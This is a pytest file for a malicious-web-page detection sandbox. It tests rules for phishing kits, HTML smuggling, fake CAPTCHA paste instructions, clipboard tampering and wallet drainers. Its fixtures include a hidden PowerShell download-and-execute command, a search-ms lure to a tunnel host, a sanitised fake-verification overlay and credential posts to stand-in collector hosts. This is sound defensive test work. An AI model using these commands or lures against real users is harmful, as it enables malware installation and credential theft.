@pytest.mark.parametrize("wrap", ["{}", "request={}", "data={}&v=2"])
def test_script_posted_credentials_decodes_one_base64_layer(wrap):
    """L2-05: kits post the credential JSON base64-encoded, whole or in one parameter."""
    import base64

    url = "https://kit.example/login"
    page = _page(url, forms=[LOOSE_PW])
    reqs = [{"method": "POST", "type": "fetch", "url": "https://collector.net/x", "frame_url": url}]
    enc = base64.b64encode(b'{"email":"a@b.c","password":"x"}').decode()
    har = [_req("https://collector.net/x", "POST", post=wrap.format(enc))]
    assert "script_posted_credentials" in _hits(_cap(url, [page], har=har, requests=reqs))


def test_base64_analytics_body_is_not_credentials():
    import base64

    url = "https://app.example/login"
    page = _page(url, title="Log in", forms=[LOOSE_PW])
    reqs = [
        {
            "method": "POST",
            "type": "fetch",
            "url": "https://analytics.vendor.net/c",
            "frame_url": url,
        }
    ]  # noqa: E501
    enc = base64.b64encode(b'{"event":"page_view","screen":"login"}').decode()
    har = [_req("https://analytics.vendor.net/c", "POST", post="e=" + enc)]
    assert "script_posted_credentials" not in _hits(_cap(url, [page], har=har, requests=reqs))


def test_script_posted_credentials_with_brand_prompt_fires_on_opaque_body():
    """Kits encrypt the body (Tycoon), so a brand credential prompt stands in for it."""
    url = "https://m365-clone.example/"
    page = _page(url, title="Sign in to your account", text="Microsoft", forms=[LOOSE_PW])
    reqs = [
        {"method": "POST", "type": "xhr", "url": "https://drop.example/r.php", "frame_url": url}
    ]  # noqa: E501
    har = [_req("https://drop.example/r.php", "POST", post="data=U2FsdGVkX1+" + "Q" * 40)]
    assert "script_posted_credentials" in _hits(_cap(url, [page], har=har, requests=reqs))


def test_runtime_dynamic_execution_fires_and_small_evals_are_quiet():
    jsapi = {
        "exec": {
            "count": 3,
            "max_len": 4000,
            "max_entropy": 5.2,
            "code_count": 3,
            "code_max_len": 4000,
            "code_max_entropy": 5.2,
        }
    }  # noqa: E501
    assert "runtime_dynamic_execution" in _hits(_cap("https://x.example/", jsapi=jsapi))
    small = {"exec": {"count": 1, "max_len": 50, "max_entropy": 2.0}}
    assert "runtime_dynamic_execution" not in _hits(_cap("https://x.example/", jsapi=small))


def test_runner_keeps_code_exec_apart_from_markup_sinks(tmp_path):
    """L2-01 capture side: innerHTML/document.write feed exec.* but not exec.code_*."""
    from types import SimpleNamespace

    from sandbox.runner.capture import Capture

    (tmp_path / "scripts").mkdir()
    stub = SimpleNamespace(jsapi={}, dynamic_scripts=0, out=tmp_path)
    Capture._on_jsapi(
        stub, "js_exec", {"api": "innerHTML", "len": 9000, "entropy": 4.9, "code": "<div>" * 1800}
    )  # noqa: E501
    Capture._on_jsapi(
        stub, "js_exec", {"api": "eval", "len": 300, "entropy": 4.1, "code": "x" * 300}
    )  # noqa: E501
    ex = stub.jsapi["exec"]
    assert (ex["count"], ex["max_len"]) == (2, 9000)
    assert (ex["code_count"], ex["code_max_len"]) == (1, 300)
    assert ex["code_samples"] == ["x" * 300]


def test_runtime_dynamic_execution_ignores_innerhtml_markup():
    """L2-01: 1 KB+ high-entropy innerHTML (inline SVG, templated markup) is not code."""
    assert "runtime_dynamic_execution" not in _hits(_cap("https://x.example/", jsapi=_MARKUP_EXEC))


# --- the sandbox's own evaluate() calls are not page code (live round 1) --------------

_PW_WRAPPER = (
    "(() => {\n      globalThis.__pwInitScripts = globalThis.__pwInitScripts || {};\n"
    '      const hasInitScript = globalThis.__pwInitScripts["3cde9adf29a22048e823b4a13cbd417f"];'
    "\n" + "      Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});\n" * 6
)
_PW_WS_DISPATCH = (
    'globalThis.__pwWebSocketDispatch({"id":"' + "5" * 64 + '","type":"sendToPage",'
    '"data":{"data":"430[null,{\\"serverVersion\\":3}]' + "x" * 400 + '"}})'
)
_PACKED = "".join(chr(33 + (i * 7919) % 90) for i in range(3000))  # high-entropy string


def _harness_exec(*page_samples):
    from sandbox.runner.page_scripts import COLLECT_SCRIPT

    samples = [_PW_WRAPPER, COLLECT_SCRIPT.strip(), _PW_WS_DISPATCH, *page_samples]
    return {
        "exec": {
            "count": 18,
            "max_len": 3000 if page_samples else 2074,
            "max_entropy": 6.4 if page_samples else 5.15,
            "code_count": 16 + len(page_samples),
            "code_max_len": 3000 if page_samples else 2074,
            "code_max_entropy": 6.4 if page_samples else 5.15,
            "code_samples": samples,
        }
    }


def test_runtime_dynamic_execution_ignores_runner_and_playwright_evals():
    """Live round 1: example.com scored 25 because frame.evaluate(COLLECT_SCRIPT) and
    Playwright's init-script wrappers go through the page's hooked eval."""
    url = "https://example.com/"
    assert "runtime_dynamic_execution" not in _hits(_cap(url, jsapi=_harness_exec()))
    js = build_facts(_cap(url, jsapi=_harness_exec()))["js"]
    assert (js["code_exec_count"], js["code_exec_max_len"]) == (13, 0)
    # A page that really evals a large packed string next to the harness noise still hits.
    packed = _cap(url, jsapi=_harness_exec(_PACKED, _PACKED[::-1]))
    assert "runtime_dynamic_execution" in _hits(packed)


def test_runner_drops_its_own_evaluate_from_exec_aggregates(tmp_path):
    from types import SimpleNamespace

    from sandbox.runner.capture import Capture
    from sandbox.runner.page_scripts import COLLECT_SCRIPT

    (tmp_path / "scripts").mkdir()
    stub = SimpleNamespace(jsapi={}, dynamic_scripts=0, out=tmp_path)
    for code in (COLLECT_SCRIPT.strip(), _PW_WRAPPER, _PW_WS_DISPATCH):
        Capture._on_jsapi(stub, "js_exec", {"api": "eval", "len": len(code), "code": code})
    assert stub.jsapi == {} and not list((tmp_path / "scripts").iterdir())
    Capture._on_jsapi(stub, "js_exec", {"api": "eval", "len": 3000, "code": _PACKED})
    assert stub.jsapi["exec"]["code_count"] == 1 and stub.dynamic_scripts == 1


def test_html_smuggling_binary_blob_fires_and_csv_export_is_quiet():
    jsapi = {"blobs": [{"ctor": "Blob", "size": 50000, "mime": "application/octet-stream"}]}
    data = _cap(
        "https://x.example/",
        jsapi=jsapi,
        downloads=[{"sha256": "aa", "suggested_filename": "invoice.exe"}],
    )  # noqa: E501
    data.download_heads = {"aa": b"MZ\x90\x00"}
    assert "html_smuggling_binary_blob" in _hits(data)
    # A reporting tool exporting a CSV via a blob, no risky download.
    assert "html_smuggling_binary_blob" not in _hits(_cap("https://x.example/", jsapi=jsapi))


def test_risky_archive_contents_and_clean_archive(tmp_path):
    import zipfile

    risky = tmp_path / "r.zip"
    with zipfile.ZipFile(risky, "w") as zf:
        zf.writestr("invoice.lnk", b"x")
    clean = tmp_path / "c.zip"
    with zipfile.ZipFile(clean, "w") as zf:
        zf.writestr("report.pdf", b"%PDF-1.7")

    def cap(path):
        d = _cap(
            "https://x.example/", downloads=[{"sha256": "aa", "suggested_filename": path.name}]
        )
        d.download_heads = {"aa": path.read_bytes()[:32780]}
        d.download_paths = {"aa": str(path)}
        return d

    assert "risky_archive_contents" in _hits(cap(risky))
    assert "risky_archive_contents" not in _hits(cap(clean))


def test_password_protected_archive_with_printed_password(tmp_path):
    import pyzipper

    enc = tmp_path / "e.zip"
    with pyzipper.AESZipFile(enc, "w", encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(b"infected")
        zf.writestr("setup.exe", b"MZ")
    page = _page("https://dl.example/", text="Download the file. Password: infected")
    d = _cap(
        "https://dl.example/", [page], downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}]
    )  # noqa: E501
    d.download_heads = {"aa": enc.read_bytes()[:32780]}
    d.download_paths = {"aa": str(enc)}
    assert "password_protected_archive_with_password" in _hits(d)
    # No printed password on the page: quiet.
    plain = _page("https://dl.example/", text="Download the file")
    d2 = _cap(
        "https://dl.example/", [plain], downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}]
    )  # noqa: E501
    d2.download_heads = {"aa": enc.read_bytes()[:32780]}
    d2.download_paths = {"aa": str(enc)}
    assert "password_protected_archive_with_password" not in _hits(d2)


def test_tech_support_locker_fires_and_video_fullscreen_is_quiet():
    page = _page(
        "https://alert.example/",
        title="Windows Defender Alert",
        text="Your computer is infected with a trojan. Call support now 1-800-555-0199.",
    )  # noqa: E501
    assert "tech_support_browser_locker" in _hits(
        _cap("https://alert.example/", [page], jsapi={"apis": {"requestFullscreen": 1}})
    )  # noqa: E501
    vid = _page("https://video.example/", title="Watch", text="Play in fullscreen")
    assert "tech_support_browser_locker" not in _hits(
        _cap("https://video.example/", [vid], jsapi={"apis": {"requestFullscreen": 1}})
    )  # noqa: E501


def test_history_flooding_fires_above_threshold():
    assert "history_flooding" in _hits(
        _cap("https://x.example/", jsapi={"apis": {"history.pushState": 40}})
    )  # noqa: E501
    assert "history_flooding" not in _hits(
        _cap("https://x.example/", jsapi={"apis": {"history.pushState": 3}})
    )  # noqa: E501


def test_push_notification_bait_fires_and_news_prompt_is_quiet():
    bait = _page(
        "https://verify.example/",
        title="Verify",
        text="Click Allow to continue and prove you are human",
    )  # noqa: E501
    assert "push_notification_bait" in _hits(
        _cap(
            "https://verify.example/", [bait], jsapi={"apis": {"Notification.requestPermission": 1}}
        )
    )  # noqa: E501
    news = _page("https://news.example/", title="News", text="Subscribe for the latest headlines")
    assert "push_notification_bait" not in _hits(
        _cap("https://news.example/", [news], jsapi={"apis": {"Notification.requestPermission": 1}})
    )  # noqa: E501


def test_cloaking_scripted_bounce_fires_and_canonical_redirect_is_quiet():
    bounce = [{"from": "https://kit.io/", "to": "https://www.google.com/404", "type": "js"}]
    data = _cap("https://www.google.com/404", redirects=bounce)
    data.domain_ages = {"kit.io": 5}
    assert "cloaking_scripted_bounce" in _hits(data)
    canon = [
        {"from": "http://shop.example/", "to": "https://www.shop.example/", "type": "http_301"}
    ]
    ok = _cap("https://www.shop.example/", redirects=canon)
    ok.domain_ages = {"shop.example": 5}
    assert "cloaking_scripted_bounce" not in _hits(ok)


def test_trusted_redirector_to_lure_fires_and_plain_ad_click_is_quiet():
    chain = [
        {"from": "https://www.google.com/url?q=x", "to": "https://lure.example/", "type": "js"}
    ]
    clip = [{"page": "p0", "api": "x", "text": 'powershell -w hidden -c "irm x|iex"'}]
    assert "trusted_redirector_to_lure" in _hits(
        _cap("https://lure.example/", redirects=chain, clipboard=clip)
    )  # noqa: E501
    assert "trusted_redirector_to_lure" not in _hits(_cap("https://shop.example/", redirects=chain))


def test_captcha_gated_credential_page_fires_and_allowlisted_is_quiet():
    har = [_req("https://challenges.cloudflare.com/turnstile/v0/api.js")]
    page = _page(
        "https://login-portal.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM]
    )  # noqa: E501
    assert "captcha_gated_credential_page" in _hits(
        _cap("https://login-portal.example/", [page], har=har)
    )  # noqa: E501
    ok = _page("https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
    assert "captcha_gated_credential_page" not in _hits(
        _cap("https://login.live.com/", [ok], har=har, allowlisted=["live.com"])
    )  # noqa: E501


def test_idp_cdn_uses_request_initiator_when_available():
    """With the A3 log, the CDN asset's initiating document host decides, precisely."""
    cdn_url = "https://aadcdn.msftauth.net/shared/logo.png"
    page = _page("https://clone.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
    har = [_req(cdn_url)]
    reqs = [
        {"method": "GET", "type": "image", "url": cdn_url, "document_url": "https://clone.example/"}
    ]  # noqa: E501
    assert "idp_cdn_assets_foreign_page" in _hits(
        _cap("https://clone.example/", [page], har=har, requests=reqs)
    )  # noqa: E501
    # The asset was loaded by a Microsoft-owned document in the session: no clone.
    reqs_ms = [
        {
            "method": "GET",
            "type": "image",
            "url": cdn_url,
            "document_url": "https://login.live.com/",
        }
    ]  # noqa: E501
    ms = _page("https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
    assert "idp_cdn_assets_foreign_page" not in _hits(
        _cap("https://clone.example/", [page, ms], har=har, requests=reqs_ms)
    )  # noqa: E501


def test_library_inventory_parses_cdn_versions():
    page = {
        "frames": [
            {
                "url": "https://kit.example/",
                "title": "",
                "text": "",
                "forms": [],
                "iframes": [],
                "scripts": [
                    {"src": "https://cdn/crypto-js@4.1.1/crypto-js.min.js"},
                    {"src": "https://cdn/ajax/libs/jquery/3.6.0/jquery.min.js"},
                ],
            }
        ]
    }  # noqa: E501
    libs = build_facts(_cap("https://kit.example/", [page]))["scripts"]["libraries"]
    names = {lib["name"]: lib["version"] for lib in libs}
    assert names.get("crypto-js") == "4.1.1"
    assert names.get("jquery") == "3.6.0"


# --- cache smuggling (L2-NEW-1) ------------------------------------------------------


def _img_resp(url, head: bytes, ctype="image/jpeg"):
    import base64

    return {
        "request": {"method": "GET", "url": url, "headers": []},
        "response": {
            "status": 200,
            "headers": [{"name": "Content-Type", "value": ctype}],
            "content": {
                "mimeType": ctype,
                "encoding": "base64",
                "text": base64.b64encode(head + b"\x00" * 64).decode(),
            },
        },
    }


_EXPLORER_STEPS = (
    "Compliance check. Open File Explorer, click the address bar, paste the path with "
    "Ctrl+V and press Enter."
)


def test_cache_smuggled_payload_fires_with_explorer_steps():
    url = "https://checker.example-host.com/"
    har = [_img_resp("https://checker.example-host.com/logo.jpg", b"PK\x03\x04")]
    data = _cap(url, [_page(url, text=_EXPLORER_STEPS)], har=har)
    facts = build_facts(data)
    assert facts["downloads"]["mislabeled_image"] == 1
    assert facts["downloads"]["mislabeled_images"][0]["magic"] == "zip"
    assert {"cache_smuggled_payload", "mislabeled_image_payload"} <= _hits(data)


def test_mislabeled_image_alone_is_only_the_booster():
    url = "https://cdn.example-host.com/"
    har = [_img_resp("https://cdn.example-host.com/a.png", b"MZ", "image/png")]
    hits = _hits(_cap(url, [_page(url, text="Gallery")], har=har))
    assert "mislabeled_image_payload" in hits
    assert "cache_smuggled_payload" not in hits


def test_real_images_and_typed_archives_are_not_mislabeled():
    url = "https://cdn.example-host.com/"
    har = [
        _img_resp("https://cdn.example-host.com/a.webp", b"RIFF\x00\x00\x00\x00WEBP", "image/webp"),
        _img_resp("https://cdn.example-host.com/b.jpg", b"\xff\xd8\xff\xe0"),
        _img_resp("https://cdn.example-host.com/c.zip", b"PK\x03\x04", "application/zip"),
    ]
    data = _cap(url, [_page(url, text=_EXPLORER_STEPS)], har=har)
    assert build_facts(data)["downloads"]["mislabeled_image"] == 0
    assert not {"cache_smuggled_payload", "mislabeled_image_payload"} & _hits(data)


# --- DE-CFX-006 no-gesture / overwritten clipboard ------------------------------------

_CMD_WRITE = "powershell -nop -c Write-Host hello"


def _cwrite(text, gesture=True, api="navigator.clipboard.writeText"):
    return {"api": api, "text": text, "trusted": False, "user_activation": gesture}


def test_command_blanked_after_write_counts_as_overwritten():
    """Regression: an empty write after a command was filtered out before the overwrite
    check, so blank-then-refill evidence wiping was invisible."""
    url = "https://verify.example-host.com/"
    data = _cap(url, [_page(url)], clipboard=[_cwrite(_CMD_WRITE), _cwrite("", gesture=False)])
    assert build_facts(data)["clipboard"]["overwritten_command"] == 1
    assert "clipboard_command_tampering" in _hits(data)


def test_command_written_without_gesture_is_the_booster():
    url = "https://verify.example-host.com/"
    data = _cap(url, [_page(url)], clipboard=[_cwrite(_CMD_WRITE, gesture=False)])
    assert build_facts(data)["clipboard"]["no_gesture_commands"] == 1
    assert "clipboard_command_tampering" in _hits(data)


def test_docs_copy_button_and_gestureless_share_link_are_quiet():
    url = "https://docs.example-host.com/"
    link = "https://docs.example-host.com/page"
    clips = [_cwrite(link, gesture=False), _cwrite(_CMD_WRITE), _cwrite(link), _cwrite("")]
    data = _cap(url, [_page(url)], clipboard=clips)
    clip = build_facts(data)["clipboard"]
    assert clip["no_gesture_commands"] == 0 and clip["overwritten_command"] == 0
    assert "clipboard_command_tampering" not in _hits(data)


# --- protocol-handler lure (L2-NEW-6) ------------------------------------------------

_SEARCH_MS = (
    "search-ms:query=invoice&crumb=location:%5C%5Cfiles.trycloudflare.com@SSL%5CDavWWWRoot"
    "&displayname=Downloads"
)


def _proto_page(url, text="", links=(), meta=()):
    page = _page(url, text=text)
    page["frames"][0]["links"] = list(links)
    page["frames"][0]["meta_refresh"] = list(meta)
    return page


def test_search_ms_to_tunnel_with_invoice_pretext_fires():
    url = "https://billing.example-host.com/"
    data = _cap(
        url,
        [_proto_page(url, "Your invoice is ready", meta=["0;url=" + _SEARCH_MS])],
        blocked=[{"url": _SEARCH_MS, "reason": "scheme 'search-ms' is not allowed"}],
    )
    nav = build_facts(data)["navigation"]
    assert nav["protocol_handler_attempts"] >= 1
    assert nav["protocol_handler_hosts"] == ["files.trycloudflare.com"]
    assert nav["protocol_handler_tunnel"] and nav["protocol_handler_masquerade"]
    assert {"protocol_handler_lure", "protocol_handler_attempt"} <= _hits(data)


def test_bare_search_ms_link_is_only_the_attempt_booster():
    url = "https://tools.example-host.com/"
    data = _cap(url, [_proto_page(url, "Tools", links=["search-ms:query=report"])])
    hits = _hits(data)
    assert "protocol_handler_attempt" in hits
    assert "protocol_handler_lure" not in hits


def test_search_label_and_allowlisted_help_page_are_quiet():
    url = "https://shop.example-host.com/"
    data = _cap(
        url,
        [
            _proto_page(
                url, "Search: invoices", links=["search:", "https://shop.example-host.com/s"]
            ),
            _proto_page("https://help.bigblog.com/", "Invoice help", links=[_SEARCH_MS]),
        ],
        allowlisted={"bigblog.com"},
    )
    assert build_facts(data)["navigation"]["protocol_handler_attempts"] == 0
    assert not {"protocol_handler_lure", "protocol_handler_attempt"} & _hits(data)


# --- Salty2FA (DE-M365-015) ----------------------------------------------------------

_MS_CLONE_HTML = (
    "<title>Sign in to your account</title><input id=i0116 type=email>"
    "<input type=password><input type=submit id=idSIButton9>"
)


def _salty(devtools=True, php="/482913.php"):
    url = "https://portal.example-host.com/"
    har = [
        _req("https://challenges.cloudflare.com/turnstile/v0/api.js"),
        _req("https://collect.example-host.ru" + php, "POST", post="request=YWJj&session=1"),
    ]
    blocked = [{"kind": "devtools_key", "key": "F12"}] if devtools else []
    return _cap(
        url,
        [_page(url, "Sign in to your account", forms=[PASSWORD_FORM])],
        har=har,
        dom_html=[{"url": url, "html": _MS_CLONE_HTML}],
        blocked_input=blocked,
    )


def test_salty2fa_four_signals_fire():
    data = _salty()
    facts = build_facts(data)
    assert facts["idp"]["numeric_php_hosts"] == ["collect.example-host.ru"]
    assert "salty2fa_kit" in _hits(data)


def test_salty2fa_needs_every_signal():
    assert "salty2fa_kit" not in _hits(_salty(devtools=False))
    assert "salty2fa_kit" not in _hits(_salty(php="/submit.php"))


# --- Apps Script credential host (L2-NEW-5) --------------------------------------------

_EXEC = "https://script.google.com/macros/s/AKfycbxExampleDeploymentId/exec"


def test_apps_script_password_page_fires_despite_google_allowlist():
    frame = "https://n-abc123-0lu-script.googleusercontent.com/userCodeAppPanel"
    data = _cap(
        _EXEC,
        [_page(_EXEC, "Document"), _page(frame, "Sign in", forms=[PASSWORD_FORM])],
        allowlisted={"google.com", "googleusercontent.com"},
    )
    forms = build_facts(data)["forms"]
    assert forms["apps_script_pages"] == 2
    assert forms["apps_script_credential_pages"] == [frame]
    assert "apps_script_credential_page" in _hits(data)


def test_apps_script_survey_and_google_login_are_quiet():
    survey = _cap(_EXEC, [_page(_EXEC, "Team lunch survey", text="Pick a day")])
    login = _cap(
        "https://accounts.google.com/signin",
        [_page("https://accounts.google.com/signin", "Sign in", forms=[PASSWORD_FORM])],
    )
    assert "apps_script_credential_page" not in _hits(survey)
    assert build_facts(login)["forms"]["apps_script_pages"] == 0
    assert "apps_script_credential_page" not in _hits(login)


# --- explorer dead drop / drainer lure (DE-W3B-003 / DE-W3B-006) --------------------


def test_explorer_api_read_on_plain_site_fires_and_dapp_is_quiet():
    url = "https://blog.example-host.com/"
    har = [_req("https://api.ethplorer.io/getAddressHistory/0xabc?apiKey=freekey")]
    data = _cap(url, [_page(url, "Recipes", text="Weekly recipes")], har=har)
    assert build_facts(data)["web3"]["explorer_api_hosts"] == ["api.ethplorer.io"]
    assert "explorer_api_dead_drop" in _hits(data)
    dapp = _cap(url, [_page(url, "Portfolio", text="Connect wallet to see balances")], har=har)
    assert "explorer_api_dead_drop" not in _hits(dapp)


def _drainer(url, text, age):
    page = _page(url, "Claim", text=text)
    page["frames"][0]["scripts"] = [
        {"src": "https://cdn.example-cdn.com/walletconnect@2.9.0/index.js"}
    ]
    data = _cap(url, [page])
    data.domain_ages = {"example-host.com": age}
    return data


def test_wallet_drainer_lure_needs_wording_library_and_young_domain():
    url = "https://claim.example-host.com/"
    assert "wallet_drainer_lure" in _hits(_drainer(url, "Claim your airdrop allocation now", 10))
    # A real, older dApp with the same wording, and a young dApp with no claim wording.
    assert "wallet_drainer_lure" not in _hits(_drainer(url, "Claim your airdrop allocation", 900))
    assert "wallet_drainer_lure" not in _hits(_drainer(url, "Swap tokens", 10))


# --- fake full-screen OS update (L2-NEW-3) -------------------------------------------

_OS_UPDATE = "Working on updates 37% complete. Don't turn off your computer."


def _osu(text, fullscreen=1, keys=True, title="Windows Update"):
    url = "https://stream.example-host.com/"
    blocked = [{"kind": "devtools_key", "key": "F11"}] if keys else []
    return _cap(
        url,
        [_page(url, title, text=text)],
        jsapi={"apis": {"requestFullscreen": fullscreen}},
        blocked_input=blocked,
    )


def test_fake_os_update_overlay_fires():
    data = _osu(_OS_UPDATE)
    assert build_facts(data)["lure"]["fake_os_update_pages"]
    assert "fake_os_update_overlay" in _hits(data)


def test_fullscreen_video_and_update_article_are_quiet():
    # Full-screen player with key handling but no update wording.
    assert "fake_os_update_overlay" not in _hits(_osu("Episode 4 - 37% watched", title="Player"))
    # A news article about Windows Update: no fullscreen, no blocking.
    article = "How to fix Windows Update stuck at 37%: do not turn off your computer."
    assert "fake_os_update_overlay" not in _hits(_osu(article, fullscreen=0, keys=False))
    # The wording alone in full screen with nothing blocked or staged.
    assert "fake_os_update_overlay" not in _hits(_osu(_OS_UPDATE, keys=False))


# --- browser-in-the-browser fake window (L2-NEW-4) -----------------------------------

_BITB_HTML = (
    '<div class="window"><div class="titlebar"><span class="dots"></span>'
    '<div class="address">https://login.microsoftonline.com/common/oauth2/authorize</div>'
    "</div><iframe src=/f></iframe></div>"
)


def test_bitb_fake_address_bar_with_live_password_fires():
    url = "https://docs-share.example-host.com/"
    frame = _page("https://docs-share.example-host.com/f", "Sign in", forms=[PASSWORD_FORM])
    dom = [{"url": url, "html": _BITB_HTML}]
    data = _cap(url, [_page(url, "Shared file"), frame], dom_html=dom)
    bar = build_facts(data)["idp"]["fake_address_bar_details"]
    assert bar[0]["shown_url"].startswith("https://login.microsoftonline.com/")
    assert "browser_in_the_browser_window" in _hits(data)


def test_bitb_tutorial_and_linked_login_are_quiet():
    url = "https://blog.example-host.com/"
    # A write-up showing the fake bar as an image/text, with no password input.
    tutorial = _cap(url, [_page(url, "What is BitB?")], dom_html=[{"url": url, "html": _BITB_HTML}])
    # A page linking to the real login (URL in href) next to its own password form.
    linked = '<a href="https://login.microsoftonline.com/">Sign in with Microsoft</a>'
    page = _page(url, "Log in", forms=[PASSWORD_FORM])
    with_link = _cap(url, [page], dom_html=[{"url": url, "html": linked}])
    assert "browser_in_the_browser_window" not in _hits(tutorial)
    assert "browser_in_the_browser_window" not in _hits(with_link)


# --- JSFuck symbol-set YARA (L2-NEW-2) -----------------------------------------------


def test_jsfuck_symbol_set_yara():
    rule = _yara("jsfuck_symbol_set")
    assert rule.match(data=b"<script>" + b"(![]+[])[+[]]" * 30 + b"</script>")
    # Minified code is bracket-heavy but always has letters and digits between them.
    assert not rule.match(data=b"a[0](b[1])+c[2]!d;" * 60)
    assert not rule.match(data=b"[]" * 99)


# --- government lookalike rule (L2-08 housekeeping) ----------------------------------


def test_government_lookalike_domain_rule_fires_and_real_gov_is_quiet():
    fake = "https://absher-gov-sa.com/login"
    assert "government_lookalike_domain" in _hits(_cap(fake, [_page(fake, "Absher")]))
    real = "https://www.absher.sa.gov.sa/login"
    assert "government_lookalike_domain" not in _hits(_cap(real, [_page(real, "Absher")]))
    vouched = _cap(fake, [_page(fake, "Absher")], allowlisted={"absher-gov-sa.com"})
    assert "government_lookalike_domain" not in _hits(vouched)


# --- credential form to a form-backend service (DE-PHI-005) --------------------------


def test_password_page_posting_to_form_collector_fires_and_contact_form_is_quiet():
    url = "https://portal.example-host.com/"
    har = [_req("https://formspree.io/f/abcdwxyz", "POST", post="email=a%40b.c&message=hi")]
    login = _cap(url, [_page(url, "Sign in", forms=[PASSWORD_FORM])], har=har)
    assert "credential_post_to_form_collector" in _hits(login)
    contact_form = {"action": "", "fields": [{"type": "email"}, {"type": "textarea"}]}
    contact = _cap(url, [_page(url, "Contact us", forms=[contact_form])], har=har)
    assert "credential_post_to_form_collector" not in _hits(contact)


# --- fake verification with Win+X / Run paste steps, no clipboard yet (LR1-02) -------

# Sanitised from a live EtherHiding kit on a compromised WordPress site: the overlay is
# appended after ~220 KB of page and its steps stay hidden until the checkbox click.
_WINX_OVERLAY = (
    '<div class="main-content" style="display:none"><p>site.example Verifying...</p>'
    "<p>Human Verification</p><p>Authorize your browser now</p>"
    "<b>PRESS AND HOLD WINDOWS KEY, THEN PRESS X</b><ol><li>In the menu that opens, select "
    "Terminal or press I</li><li>In the terminal verification, press Ctrl + V</li>"
    "<li>Press Enter</li></ol><span>Ray ID: 0000000000000000</span></div>"
)
_FILLER = "<p>" + "Consultoria especializada para maximizar resultados. " * 400 + "</p>"


def _winx_cap(url, html, text="Consultoria Contacto"):
    page = _page(url, "STRATEX - Consultoria", text=text)
    return _cap(url, [page], dom_html=[{"url": url, "html": html}])


def test_fake_captcha_paste_steps_fire_when_hidden_after_a_long_page():
    url = "https://site.example/"
    data = _winx_cap(url, f"<html><body>{_FILLER}{_WINX_OVERLAY}</body></html>")
    assert "fake_captcha_paste_instructions" in _hits(data)
    assert build_facts(data)["clipboard"]["writes"] == 0  # no click, no clipboard write


def test_real_challenge_and_helpdesk_paste_steps_are_not_fake_captcha():
    url = "https://site.example/"
    challenge = (
        "<html><body><h1>Verify you are human by completing the action below.</h1>"
        "<p>site.example needs to review the security of your connection.</p>"
        "<p>Ray ID: 0000000000000000</p></body></html>"
    )
    helpdesk = (
        "<html><body><h1>Install the VPN client</h1><p>Press Win + X, open Terminal, then "
        "paste the command below with Ctrl + V.</p></body></html>"
    )
    # Both phrasings on one long page, but nowhere near each other.
    far_apart = (
        "<html><body><p>Enter the verification code we emailed you.</p>"
        f"{_FILLER}{_FILLER}<p>Press Win + X, open Terminal and paste with Ctrl + V.</p>"
        "</body></html>"
    )
    for html in (challenge, helpdesk, far_apart):
        assert "fake_captcha_paste_instructions" not in _hits(_winx_cap(url, html))
